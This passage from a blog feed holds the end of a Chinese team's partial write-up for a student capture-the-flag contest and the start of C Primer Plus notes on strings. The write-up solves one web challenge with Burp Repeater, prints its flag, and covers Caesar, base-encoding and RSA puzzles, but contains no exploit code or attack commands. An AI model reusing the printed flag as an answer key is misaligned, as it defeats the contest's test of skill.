&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1260.png&#34;
	width=&#34;465&#34;
	height=&#34;291&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1260_hu17042204859368960282.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1260_hu14609724441553710519.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;159&#34;
		data-flex-basis=&#34;383px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;折返去看没想到吧.txt【确实没想到】把这串很像密码的东西转码试试，十六进制转字符串：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1262.png&#34;
	width=&#34;538&#34;
	height=&#34;87&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1262_hu3692787370129559431.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1262_hu5900024745459064206.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;618&#34;
		data-flex-basis=&#34;1484px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1264.png&#34;
	width=&#34;441&#34;
	height=&#34;120&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1264_hu16475342964199510989.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1264_hu5175697599932009123.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;367&#34;
		data-flex-basis=&#34;882px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;image1266png&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1266.png&#34;
	width=&#34;346&#34;
	height=&#34;93&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1266_hu3087992174087682782.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1266_hu12989048845376400963.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;372&#34;
		data-flex-basis=&#34;892px&#34;
	
&gt;
&lt;/h2&gt;&lt;h3 id=&#34;web1-easyjs&#34;&gt;++Web1 easyjs：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：郭泽坤&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;打开网页发现一直刷新，提示我们让网页停止刷新就可以拿到flag，想到用Burp拦截。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1328.png&#34;
	width=&#34;554&#34;
	height=&#34;297&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1328_hu16207704286691047768.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1328_hu2352272372346920893.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;拦截之后并未发现什么有价值信息，尝试发送给中继器，直接运行，发现flag：Flag: flag{0k_u_hav3_caught_m3_}&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1331.png&#34;
	width=&#34;554&#34;
	height=&#34;297&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1331_hu9371496989367453119.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1331_hu12449183728474089523.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;186&#34;
		data-flex-basis=&#34;447px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;没了，web就做出来一道，嘤。&lt;/del&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto1我混乱了&#34;&gt;++Crypto1我混乱了：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：李江川&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1450.png&#34;
	width=&#34;327&#34;
	height=&#34;108&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1450_hu3142768077891479587.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1450_hu6870696763204264501.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;302&#34;
		data-flex-basis=&#34;726px&#34;
	
&gt;
是长的挺乱的，但是依稀可见rxms像是flag的字样，凯撒密码转换器转换一下得到flag：
&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1477.png&#34;
	width=&#34;393&#34;
	height=&#34;340&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1477_hu12093498511791206320.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1477_hu17011773509566710220.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;115&#34;
		data-flex-basis=&#34;277px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto2很基础的大礼包&#34;&gt;++Crypto2很基础的大礼包：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：李江川&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1296.png&#34;
	width=&#34;1030&#34;
	height=&#34;121&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1296_hu1335351953071347348.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1296_hu5558788827711169069.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;851&#34;
		data-flex-basis=&#34;2042px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;辗转相转法，爱的flag转圈圈：
首先16转文本：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1300.png&#34;
	width=&#34;1505&#34;
	height=&#34;396&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1300_hu15682735990388007663.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1300_hu13024873965618712137.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;380&#34;
		data-flex-basis=&#34;912px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;接着base32：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1302.png&#34;
	width=&#34;811&#34;
	height=&#34;299&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1302_hu3788311242272259500.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1302_hu1954975571518920847.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;271&#34;
		data-flex-basis=&#34;650px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后两次base64：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1305.png&#34;
	width=&#34;497&#34;
	height=&#34;322&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1305_hu3509075897259265797.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1305_hu12767080713536609959.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;154&#34;
		data-flex-basis=&#34;370px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;第二次：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1308.png&#34;
	width=&#34;421&#34;
	height=&#34;331&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1308_hu7366230949186703355.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1308_hu4206425758602205916.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;127&#34;
		data-flex-basis=&#34;305px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;crypto3暴力的rsa&#34;&gt;++Crypto3暴力的RSA：++
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;解题：赵乐祺&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;题目说的很明白了，RSA加密算法：&lt;/p&gt;
&lt;p&gt;txt打开是这个样子的：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1279.png&#34;
	width=&#34;1031&#34;
	height=&#34;182&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1279_hu13856426976507313106.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1279_hu9033260698196634381.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;566&#34;
		data-flex-basis=&#34;1359px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;想着能不能转换成可以看懂的东西的想法，尝试把后缀名改成了c，希望得到代码什么的，结果得到了：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1282.png&#34;
	width=&#34;251&#34;
	height=&#34;834&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1282_hu3324291952954560812.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1282_hu4082113360023082690.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;30&#34;
		data-flex-basis=&#34;72px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;从网上找一下算法步骤：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1288.png&#34;
	width=&#34;1203&#34;
	height=&#34;283&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1288_hu17702069953608971021.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1288_hu13428144350421095934.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;425&#34;
		data-flex-basis=&#34;1020px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;密匙有了，大数位运算，py来得方便【比c高精度友好多了】&lt;/p&gt;
&lt;h2 id=&#34;image1294png&#34;&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1294.png&#34;
	width=&#34;405&#34;
	height=&#34;27&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1294_hu17175974537112969412.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1294_hu3423606321418761275.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;1500&#34;
		data-flex-basis=&#34;3600px&#34;
	
&gt;
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;以上，就是我们OooooohLeeGay小队做出来的题目，至于剩下的，大多是做一半卡死了&lt;/em&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;以下是做一半的思路&lt;/em&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;web2奥里给&#34;&gt;++Web2奥里给：++
&lt;/h3&gt;&lt;p&gt;放进burp里查了半天，李江川同学查出来个页面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1531.png&#34;
	width=&#34;1582&#34;
	height=&#34;808&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1531_hu2289419074797815669.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1531_hu911362496150743244.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;195&#34;
		data-flex-basis=&#34;469px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;然后无果，无奈。
其他的web也试了试，皆无果而终。&lt;/p&gt;
&lt;h3 id=&#34;re46&#34;&gt;++Re4&amp;amp;&amp;amp;6：++
&lt;/h3&gt;&lt;p&gt;re4在找各种蛛丝马迹【因为ida用的不熟】：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1537.png&#34;
	width=&#34;370&#34;
	height=&#34;739&#34;
	srcset=&#34;https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1537_hu4838491944954141736.png 480w, https://dorinxl.github.io/p/%E7%AC%AC%E4%B8%80%E5%B1%8A%E4%BF%A1%E5%AE%89%E6%9D%AF%E9%83%A8%E5%88%86writeup/1537_hu18292515262571295154.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;50&#34;
		data-flex-basis=&#34;120px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;当我发觉到flag被分为各个部分的时候，我就意识到八成找不全了。&lt;/p&gt;
&lt;p&gt;至于re6同样在各种软件中检测一番无果而终&lt;/p&gt;
&lt;h3 id=&#34;misc&#34;&gt;++Misc：++
&lt;/h3&gt;&lt;p&gt;喵喵的思考，一只猫愣是把我盯得无能狂怒。
Dance，看着word文档，改成了zip文件解压之后就不会了。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;以上&#34;&gt;&lt;em&gt;以上。&lt;/em&gt;
&lt;/h1&gt;</description>
        </item>
        <item>
        <title>《C Prime Plus》第十一节笔记</title>
        <link>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82%E7%AC%94%E8%AE%B0/</link>
        <pubDate>Wed, 06 Nov 2019 03:04:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/c-prime-plus%E7%AC%AC%E5%8D%81%E4%B8%80%E8%8A%82%E7%AC%94%E8%AE%B0/</guid>
        <description>&lt;h1 id=&#34;第十一章-字符串和字符串函数&#34;&gt;第十一章 字符串和字符串函数
&lt;/h1&gt;&lt;hr&gt;
&lt;h3 id=&#34;111-i表示字符串和字符串io&#34;&gt;11.1 i表示字符串和字符串I/O
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;puts()函数只显示字符串，而且自动在显示的字符串末尾加上换行符&lt;/li&gt;
&lt;/ul&gt;
&lt;h5 id=&#34;1111-在程序中定义字符串&#34;&gt;11.1.1 在程序中定义字符串
&lt;/h5&gt;&lt;ol&gt;
&lt;li&gt;字符串字面量(字符串常量)
&lt;ul&gt;
&lt;li&gt;用双引号括起来的内容称为字符串字面量(string literal),也叫字符串常量(string constant)&lt;/li&gt;
&lt;li&gt;字符串常量属于静态储存类别&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;字符串数组和初始化
&lt;ul&gt;
&lt;li&gt;让编译器计算数组大小只能用在初始化数组时。如果创建一个稍后再填充的数组，就必须在声明时指定大小。&lt;/li&gt;
&lt;li&gt;两种初始化：&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  1. 字符数组名初始化： char car[10] = &amp;#34;Tata&amp;#34;；
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  2. 指针数组初始化：   char * pt1 = &amp;#34;Something is pointing at me&amp;#34;;  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;数组和指针的区别
&lt;ul&gt;
&lt;li&gt;字符串储存在静态储存区中&lt;/li&gt;
&lt;li&gt;初始化数组把静态存储区的【字符串】拷贝到数组中，而初始化指针只把字符串的【地址】拷贝给指针&lt;/li&gt;
&lt;li&gt;数组的元素是变量（除非数组被声明成const），但数组名不是变量。&lt;/li&gt;
&lt;li&gt;如果不修改字符串，不要用指针指向字符串字面量。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;字符串数组
&lt;ul&gt;
&lt;li&gt;创建字符数组：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. 指向字符串的字符数组
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. char类型数组的数组
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;下标访问字符串&lt;/li&gt;
&lt;li&gt;字符串数组[字符串下标][字符串字符]&lt;/li&gt;
&lt;li&gt;字符数组和char数组的区别：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1. 大小不同，类型不同。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2. 储存方式不同，静态内存和副本的区别。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3. 字符串数组分配内存的使用率较低。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在选择上
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1.需求效率：使用指针数组，但是不可修改，会擦写程序内存。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;2.需求更改或输入：使用字符数组，但是效率低。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h5 id=&#34;1112-指针和字符串&#34;&gt;11.1.2 指针和字符串
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;区分指针的值，指针指向的值：指针的值是指向的地址，指针指向的值是地址存储的内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h3 id=&#34;112-字符串输入&#34;&gt;11.2 字符串输入
&lt;/h3&gt;&lt;hr&gt;
&lt;h5 id=&#34;1121-分配空间&#34;&gt;11.2.1 分配空间
&lt;/h5&gt;&lt;ul&gt;
&lt;li&gt;在创建字符串数组时有必要分配空间，以防止擦写其他程序或内存
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
